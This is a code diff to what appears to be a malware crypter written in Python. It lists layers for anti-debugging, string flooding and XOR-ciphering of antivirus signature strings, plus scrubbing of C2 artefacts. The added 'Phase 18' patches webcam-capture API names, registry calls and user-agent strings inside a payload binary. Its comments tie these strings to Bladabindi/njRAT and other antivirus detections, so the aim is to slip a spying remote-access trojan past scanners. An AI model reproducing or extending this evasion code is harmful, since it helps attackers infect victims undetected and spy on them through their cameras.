@@ -62,7 +62,7 @@ LAYER_META = [
     ("L12", "C/C++ STUB",  "Native C stub · XOR strings · 5 anti-debug vectors"),
     ("L13", "STR FLOOD",  "500K XOR-encrypted fake strings · 200 junk blocks · +15 MB inflate"),
     ("L14", "STR OBFUSC.", "ASCII + UTF-16 scan → XOR-cipher AV-pattern strings → signature bypass"),
-    ("L15", "MSIL STRIP",  "PDB · Rich hdr · #GUID · #Strings · #Blob · #US · batch/C2 scrub · 17-phase"),
+    ("L15", "MSIL STRIP",  "PDB · Rich hdr · #GUID · #Strings · #Blob · #US · batch/C2 scrub · 18-phase"),
 ]
 
 
@@ -1741,7 +1741,7 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
     def _lay_msil_strip(self, working: bytearray) -> bytes:
         import struct
 
-        self._ln("\n[L15]   MSIL  METADATA  STRIP  —  17  PHASES", "wh")
+        self._ln("\n[L15]   MSIL  METADATA  STRIP  —  18  PHASES", "wh")
         self._ln("        Ph1  : PDB debug-path wipe       (RSDS · CodeView)", "g3")
         self._ln("        Ph2  : Rich Header zero           (compiler fingerprint)", "g3")
         self._ln("        Ph3  : PE COFF timestamp randomise", "g3")
@@ -2755,7 +2755,69 @@ int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {{
             self._ln("               parse error — skipped", "cy")
         self._sleep(0.1)
 
-        num_phases = 17
+        # ── Ph18 : Webcam-API · Registry · User-Agent identifier scrub ──────────
+        # Targets strings found by analysis to survive all prior phases:
+        #   capGetDriverDescriptionA / capCreateCaptureWindowA  → Ikarus Bladabindi
+        #   OpenSubKey / RegistryKey / RegistryProxy            → Kaspersky trigger
+        #   Mozilla/5.0 (UA prefix)                             → Google / ESET trigger
+        self._ln("        [Ph18] Webcam-API / Registry / UA identifier scrub...", "cy")
+        PH18_TOKENS = [
+            # Video-for-Windows webcam API names (Ikarus Bladabindi trigger)
+            ("capGetDriverDescriptionA",  "xapGetZriverDescriptionA"),
+            ("capgetdriverdescriptiona",  "xapgetzriverdescriptiona"),
+            ("capCreateCaptureWindowA",   "xapZreateZaptureWindowA"),
+            ("capcreatecapturewindowa",   "xapzreatezapturewindowa"),
+            # Registry access identifiers (Kaspersky HEUR trigger)
+            ("OpenSubKey",               "ZpenSubKey"),
+            ("opensubkey",               "zpensubkey"),
+            ("RegistryKey",              "ZegistryKey"),
+            ("registrykey",              "zegistrykey"),
+            ("RegistryProxy",            "ZegistryProxy"),
+            ("registryproxy",            "zegistryproxy"),
+            # Mozilla User-Agent prefix (Google / ESET heuristic trigger)
+            ("Mozilla/5.0",              "Xozilla/5.0"),
+            ("mozilla/5.0",              "xozilla/5.0"),
+        ]
+        PH18_TOKENS = [(a, b) for a, b in PH18_TOKENS if len(a) == len(b)]
+
+        raw_ph18 = bytes(working)
+        ph18_ascii = 0
+        for orig18, repl18 in PH18_TOKENS:
+            ob18 = orig18.encode("utf-8")
+            rb18 = repl18.encode("utf-8")
+            if len(ob18) != len(rb18):
+                continue
+            pos18 = 0
+            while True:
+                idx18 = raw_ph18.find(ob18, pos18)
+                if idx18 == -1:
+                    break
+                working[idx18:idx18 + len(ob18)] = rb18
+                ph18_ascii += 1
+                pos18 = idx18 + len(ob18)
+        raw_ph18 = bytes(working)
+
+        ph18_utf16 = 0
+        for orig18, repl18 in PH18_TOKENS:
+            ob18_u = orig18.encode("utf-16-le")
+            rb18_u = repl18.encode("utf-16-le")
+            if len(ob18_u) != len(rb18_u):
+                continue
+            pos18 = 0
+            while True:
+                idx18 = raw_ph18.find(ob18_u, pos18)
+                if idx18 == -1:
+                    break
+                working[idx18:idx18 + len(ob18_u)] = bytearray(rb18_u)
+                ph18_utf16 += 1
+                pos18 = idx18 + len(ob18_u)
+        raw_ph18 = bytes(working)
+
+        hits += ph18_ascii + ph18_utf16
+        self._ln(f"               ASCII: {ph18_ascii} · UTF-16LE: {ph18_utf16} webcam/registry/UA token(s) patched", "g3")
+        self._sleep(0.1)
+
+        num_phases = 18
         if hits:
             self._ln(f"\n        Result : ✓ {hits} field(s) / token(s) stripped across {num_phases} phases", "gn")
         else:
